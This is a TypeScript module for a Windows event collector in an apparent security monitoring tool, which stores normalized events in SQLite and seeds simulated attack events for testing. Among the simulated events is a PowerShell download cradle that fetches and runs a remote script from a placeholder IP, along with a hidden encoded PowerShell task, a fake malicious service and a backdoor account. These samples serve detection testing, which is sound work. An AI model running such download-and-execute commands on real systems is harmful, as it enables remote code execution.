import os from 'node:os';
import crypto from 'node:crypto';
import { 
  NormalizedEvent, 
  CollectorMetrics, 
  NormalizedEventQueryParams, 
  EventCategory 
} from './types.js';
import { normalizeEvent } from './normalizer.js';
import { shouldCollectEvent, getCollectorConfig } from './channels.js';
import { query, run } from '../db/index.js';
import { logger } from '../logger/index.js';

const log = logger.forComponent('EventCollector');

class WindowsEventCollector {
  private metrics: CollectorMetrics = {
    totalCollected: 0,
    totalNormalized: 0,
    totalFilteredNoise: 0,
    totalIngestedToDb: 0,
    activeChannelsCount: 6,
    lastCollectionTimestamp: undefined,
    eventsPerChannel: {},
    eventsPerCategory: {
      process: 0,
      network: 0,
      file: 0,
      registry: 0,
      windows_event: 0
    }
  };

  // Low resource usage: Bounded in-memory deduplication cache
  private dedupCache = new Set<string>();
  private readonly maxDedupSize = 5000;

  constructor() {
    this.refreshMetricsFromDb();
  }

  public refreshMetricsFromDb(): void {
    try {
      const catCounts = query<{ event_category: string; cnt: number }>(
        'SELECT event_category, COUNT(*) as cnt FROM normalized_events GROUP BY event_category'
      );
      for (const row of catCounts) {
        if (row.event_category in this.metrics.eventsPerCategory) {
          this.metrics.eventsPerCategory[row.event_category as EventCategory] = row.cnt;
        }
      }

      const chanCounts = query<{ channel: string; cnt: number }>(
        'SELECT channel, COUNT(*) as cnt FROM normalized_events WHERE channel IS NOT NULL GROUP BY channel'
      );
      for (const row of chanCounts) {
        this.metrics.eventsPerChannel[row.channel] = row.cnt;
      }

      const totalRes = query<{ cnt: number }>('SELECT COUNT(*) as cnt FROM normalized_events');
      this.metrics.totalIngestedToDb = totalRes[0]?.cnt || 0;
      this.metrics.totalNormalized = this.metrics.totalIngestedToDb;
    } catch {
      // Table might not be ready yet
    }
  }

  /**
   * Generates a unique deduplication signature
   */
  private makeSignature(event: Partial<NormalizedEvent>): string {
    if (event.channel && event.windows_event_id) {
      // Windows Event logs are deduplicated on channel, event ID, specific timestamp, and actor
      return `${event.channel}:${event.windows_event_id}:${event.timestamp || ''}:${event.user_name || ''}:${event.process_name || ''}:${event.action || ''}`;
    }
    // General telemetry: deduplicate only when explicit event_uuid is reused
    if (event.event_uuid) {
      return `uuid:${event.event_uuid}`;
    }
    return `evt:${Date.now()}:${Math.random()}`;
  }

  /**
   * Ingests and normalizes any event (Windows event log or telemetry)
   */
  public ingest(rawEvent: any): { normalized: NormalizedEvent; isNoise: boolean; isDuplicate: boolean; storedId?: number } {
    this.metrics.totalCollected++;

    // 1. Noise check if Windows Event Log
    if (rawEvent.channel && rawEvent.windows_event_id) {
      const allowed = shouldCollectEvent(
        rawEvent.channel,
        Number(rawEvent.windows_event_id),
        rawEvent.user_name || rawEvent.user
      );
      if (!allowed) {
        this.metrics.totalFilteredNoise++;
        return {
          normalized: normalizeEvent(rawEvent),
          isNoise: true,
          isDuplicate: false
        };
      }
    }

    // 2. Normalize Event
    const normalized = normalizeEvent(rawEvent);
    this.metrics.totalNormalized++;

    // 3. Deduplication Check (Low Resource Optimization)
    const sig = this.makeSignature(normalized);
    if (this.dedupCache.has(sig)) {
      return {
        normalized,
        isNoise: false,
        isDuplicate: true
      };
    }

    // Add to dedup cache with eviction if bounded limit reached
    if (this.dedupCache.size >= this.maxDedupSize) {
      const firstKey = this.dedupCache.values().next().value;
      if (firstKey) this.dedupCache.delete(firstKey);
    }
    this.dedupCache.add(sig);

    // 4. Store in SQLite
    const storedId = this.store(normalized);
    normalized.id = storedId;

    // 5. Update Metrics
    this.metrics.totalIngestedToDb++;
    this.metrics.lastCollectionTimestamp = normalized.timestamp;
    this.metrics.eventsPerCategory[normalized.event_category] = (this.metrics.eventsPerCategory[normalized.event_category] || 0) + 1;
    if (normalized.channel) {
      this.metrics.eventsPerChannel[normalized.channel] = (this.metrics.eventsPerChannel[normalized.channel] || 0) + 1;
    }

    return {
      normalized,
      isNoise: false,
      isDuplicate: false,
      storedId
    };
  }

  /**
   * Persists a normalized event into the SQLite normalized_events table
   */
  public store(event: NormalizedEvent): number {
    try {
      const res = run(
        `INSERT INTO normalized_events (
          event_uuid, event_category, event_type, timestamp, hostname,
          provider, channel, windows_event_id, severity, action,
          user_name, user_domain, user_sid, logon_id, logon_type,
          process_id, process_name, process_path, command_line,
          parent_process_id, parent_process_name, file_hash,
          source_ip, source_port, destination_ip, destination_port, protocol,
          target_user, target_resource, file_path, registry_key,
          service_name, service_file_name, task_name, script_text,
          message, data_json, is_alerted, created_at
        ) VALUES (
          ?, ?, ?, ?, ?,
          ?, ?, ?, ?, ?,
          ?, ?, ?, ?, ?,
          ?, ?, ?, ?,
          ?, ?, ?,
          ?, ?, ?, ?, ?,
          ?, ?, ?, ?,
          ?, ?, ?, ?,
          ?, ?, ?, ?
        )`,
        [
          event.event_uuid,
          event.event_category,
          event.event_type,
          event.timestamp,
          event.hostname,
          event.provider || null,
          event.channel || null,
          event.windows_event_id || null,
          event.severity,
          event.action,
          event.user_name || null,
          event.user_domain || null,
          event.user_sid || null,
          event.logon_id || null,
          event.logon_type || null,
          event.process_id || null,
          event.process_name || null,
          event.process_path || null,
          event.command_line || null,
          event.parent_process_id || null,
          event.parent_process_name || null,
          event.file_hash || null,
          event.source_ip || null,
          event.source_port || null,
          event.destination_ip || null,
          event.destination_port || null,
          event.protocol || null,
          event.target_user || null,
          event.target_resource || null,
          event.file_path || null,
          event.registry_key || null,
          event.service_name || null,
          event.service_file_name || null,
          event.task_name || null,
          event.script_text || null,
          event.message,
          event.data_json || null,
          event.is_alerted ? 1 : 0,
          event.created_at || new Date().toISOString()
        ]
      );

      // Also ensure legacy events table is updated for any existing queries
      let legacyEventRowId = res.lastInsertRowid;
      try {
        const legacyRes = run(
          `INSERT OR IGNORE INTO events (
            event_id, event_type, timestamp, process_name, process_id,
            parent_process_id, parent_process_name, parent_command_line, command_line,
            user, image_path, file_hash, destination_ip, destination_port,
            registry_key, source, raw_json
          ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
          [
            event.event_uuid,
            event.event_type,
            event.timestamp,
            event.process_name || null,
            event.process_id || null,
            event.parent_process_id || null,
            event.parent_process_name || null,
            event.parent_command_line || null,
            event.command_line || null,
            event.user_name || null,
            event.process_path || null,
            event.file_hash || null,
            event.destination_ip || null,
            event.destination_port || null,
            event.registry_key || null,
            event.channel || 'windows_events',
            event.data_json || null
          ]
        );
        if (legacyRes && legacyRes.lastInsertRowid) {
          legacyEventRowId = legacyRes.lastInsertRowid;
        }
      } catch {
        // Non-fatal
      }

      return legacyEventRowId;
    } catch (err) {
      log.error('Failed to store normalized event in SQLite:', err);
      throw err;
    }
  }

  /**
   * Queries normalized events from SQLite with filtering
   */
  public queryEvents(params: NormalizedEventQueryParams = {}): { total: number; events: NormalizedEvent[] } {
    let sql = 'SELECT * FROM normalized_events WHERE 1=1';
    let countSql = 'SELECT COUNT(*) as total FROM normalized_events WHERE 1=1';
    const bindings: any[] = [];
    const countBindings: any[] = [];

    if (params.category && params.category !== 'all') {
      sql += ' AND event_category = ?';
      countSql += ' AND event_category = ?';
      bindings.push(params.category);
      countBindings.push(params.category);
    }

    if (params.channel && params.channel !== 'all') {
      sql += ' AND channel = ?';
      countSql += ' AND channel = ?';
      bindings.push(params.channel);
      countBindings.push(params.channel);
    }

    if (params.windows_event_id) {
      sql += ' AND windows_event_id = ?';
      countSql += ' AND windows_event_id = ?';
      bindings.push(params.windows_event_id);
      countBindings.push(params.windows_event_id);
    }

    if (params.severity && params.severity !== 'all') {
      sql += ' AND severity = ?';
      countSql += ' AND severity = ?';
      bindings.push(params.severity);
      countBindings.push(params.severity);
    }

    if (params.search) {
      const term = `%${params.search}%`;
      const searchClause = ' AND (message LIKE ? OR process_name LIKE ? OR user_name LIKE ? OR target_user LIKE ? OR service_name LIKE ? OR task_name LIKE ? OR command_line LIKE ?)';
      sql += searchClause;
      countSql += searchClause;
      bindings.push(term, term, term, term, term, term, term);
      countBindings.push(term, term, term, term, term, term, term);
    }

    sql += ' ORDER BY id DESC LIMIT ? OFFSET ?';
    const limit = Math.min(params.limit || 100, 500);
    const offset = params.offset || 0;
    bindings.push(limit, offset);

    const totalRes = query<{ total: number }>(countSql, countBindings);
    const total = totalRes[0]?.total || 0;
    const events = query<NormalizedEvent>(sql, bindings);

    return { total, events };
  }

  public getEventById(id: number | string): NormalizedEvent | null {
    const isNum = !isNaN(Number(id));
    const sql = isNum ? 'SELECT * FROM normalized_events WHERE id = ?' : 'SELECT * FROM normalized_events WHERE event_uuid = ?';
    const rows = query<NormalizedEvent>(sql, [id]);
    return rows[0] || null;
  }

  public getMetrics(): CollectorMetrics {
    return { ...this.metrics };
  }

  /**
   * Generates high-fidelity, safe simulated Windows Events for testing and demonstration
   */
  public generateSimulatedEvent(scenario: string): NormalizedEvent {
    const host = os.hostname() || 'WIN-ENDPOINT-01';
    const now = new Date().toISOString();

    switch (scenario) {
      case 'successful_logon':
        return normalizeEvent({
          channel: 'Security',
          windows_event_id: 4624,
          user_name: 'SecAdmin',
          user_domain: 'CORP',
          user_sid: 'S-1-5-21-123456789-500',
          logon_type: 2, // Interactive
          logon_id: '0x1F2A3B',
          process_name: 'winlogon.exe',
          process_path: 'C:\\Windows\\System32\\winlogon.exe',
          source_ip: '127.0.0.1',
          action: 'Successful Interactive Logon',
          severity: 'INFORMATIONAL',
          message: 'An account was successfully logged on. Account Name: SecAdmin, Logon Type: 2 (Interactive)',
          data_json: { LogonType: 2, AuthenticationPackage: 'Kerberos', WorkstationName: host }
        });

      case 'failed_logon':
        return normalizeEvent({
          channel: 'Security',
          windows_event_id: 4625,
          user_name: 'Administrator',
          user_domain: 'CORP',
          logon_type: 10, // Remote Interactive (RDP)
          source_ip: '192.168.1.185',
          source_port: 55432,
          action: 'Failed Remote Logon Attempt (Bad Password)',
          severity: 'MEDIUM',
          message: 'An account failed to log on. Account Name: Administrator, Failure Reason: Unknown user name or bad password (0xC000006A)',
          data_json: { Status: '0xC000006D', SubStatus: '0xC000006A', LogonType: 10, CallerProcessName: 'C:\\Windows\\System32\\svchost.exe' }
        });

      case 'account_creation':
        return normalizeEvent({
          channel: 'Security',
          windows_event_id: 4720,
          user_name: 'LocalAdmin',
          user_domain: host,
          target_user: 'backdoor_user',
          target_domain: host,
          action: 'A user account was created: backdoor_user',
          severity: 'HIGH',
          message: 'A user account was created. Creator: LocalAdmin, Target Account: backdoor_user (Shadow Admin)',
          data_json: { TargetSid: 'S-1-5-21-99887766-1005', SamAccountName: 'backdoor_user' }
        });

      case 'privilege_change':
        return normalizeEvent({
          channel: 'Security',
          windows_event_id: 4672,
          user_name: 'ElevatedService',
          user_domain: host,
          privilege_list: ['SeDebugPrivilege', 'SeTcbPrivilege', 'SeSecurityPrivilege', 'SeTakeOwnershipPrivilege'],
          action: 'Special Administrative Privileges Assigned to Logon',
          severity: 'HIGH',
          message: 'Special privileges assigned to new logon. Privileges: SeDebugPrivilege, SeTcbPrivilege',
          data_json: { Privileges: ['SeDebugPrivilege', 'SeTcbPrivilege', 'SeBackupPrivilege'] }
        });

      case 'service_creation':
        return normalizeEvent({
          channel: 'System',
          windows_event_id: 7045,
          service_name: 'WinDefendUpdateSvc',
          service_file_name: 'C:\\Users\\Public\\malicious_service.exe',
          user_name: 'SYSTEM',
          action: 'New Service Installed: WinDefendUpdateSvc',
          severity: 'HIGH',
          message: 'A service was installed in the system. Service Name: WinDefendUpdateSvc, Service File Name: C:\\Users\\Public\\malicious_service.exe, Service Type: user mode service',
          data_json: { ServiceType: 'user mode service', StartType: 'auto start', ServiceAccount: 'LocalSystem' }
        });

      case 'scheduled_task':
        return normalizeEvent({
          channel: 'Task Scheduler',
          windows_event_id: 106,
          task_name: '\\Microsoft\\Windows\\Maintenance\\DailyReconTask',
          user_name: 'Administrator',
          command_line: 'powershell.exe -w hidden -enc V3JpdGUtSG9zdCAnVGFzayBFZHIgVGVzdCc=',
          action: 'Scheduled Task Registered: \\Microsoft\\Windows\\Maintenance\\DailyReconTask',
          severity: 'MEDIUM',
          message: 'User Administrator registered Task Scheduler task \\Microsoft\\Windows\\Maintenance\\DailyReconTask with action powershell.exe',
          data_json: { Action: 'powershell.exe -w hidden -enc V3JpdGUtSG9zdCAnVGFzayBFZHIgVGVzdCc=' }
        });

      case 'powershell_activity':
        return normalizeEvent({
          channel: 'PowerShell',
          windows_event_id: 4104,
          user_name: 'User',
          process_name: 'powershell.exe',
          process_id: 4892,
          script_text: '$client = New-Object System.Net.WebClient; $payload = $client.DownloadString("http://198.51.100.12/cradle.ps1"); IEX $payload',
          action: 'Suspicious PowerShell ScriptBlock Logging (Download Cradle)',
          severity: 'HIGH',
          message: 'Creating Scriptblock text (1 of 1): $client = New-Object System.Net.WebClient; $payload = $client.DownloadString("http://198.51.100.12/cradle.ps1"); IEX $payload',
          data_json: { ScriptBlockId: crypto.randomUUID(), Path: 'C:\\Users\\User\\AppData\\Local\\Temp\\script.ps1' }
        });

      case 'defender_disabled':
        return normalizeEvent({
          channel: 'Windows Defender',
          windows_event_id: 5001,
          user_name: 'SYSTEM',
          action: 'Windows Defender Real-time Protection Disabled',
          severity: 'CRITICAL',
          message: 'Microsoft Defender Antivirus real-time protection feature has been disabled. Product State: 0x00000000',
          data_json: { ProductState: 'Disabled', Component: 'Real-time Monitoring' }
        });

      case 'audit_cleared':
        return normalizeEvent({
          channel: 'Security',
          windows_event_id: 1102,
          user_name: 'AttackerAccount',
          action: 'The audit log was cleared',
          severity: 'CRITICAL',
          message: 'The audit log was cleared. Subject: AttackerAccount. This is a severe anti-forensic action.',
          data_json: { LogName: 'Security', Reason: 'Manual clearing' }
        });

      default:
        return normalizeEvent({
          channel: 'Security',
          windows_event_id: 4624,
          user_name: 'User',
          action: 'Interactive Logon Event',
          message: `Generic activity logged on ${host}`
        });
    }
  }

  /**
   * Seeds realistic baseline Windows Event Logs so dashboard is rich and informative immediately
   */
  public seedBaselineEvents(): void {
    const existingCount = query<{ cnt: number }>('SELECT COUNT(*) as cnt FROM normalized_events')[0]?.cnt || 0;
    if (existingCount >= 10) return;

    log.info('Seeding baseline normalized Windows Event Logs');
    const scenarios = [
      'successful_logon',
      'failed_logon',
      'privilege_change',
      'scheduled_task',
      'service_creation',
      'powershell_activity',
      'account_creation'
    ];

    for (const s of scenarios) {
      const evt = this.generateSimulatedEvent(s);
      this.store(evt);
    }

    this.refreshMetricsFromDb();
  }
}

export const eventCollector = new WindowsEventCollector();
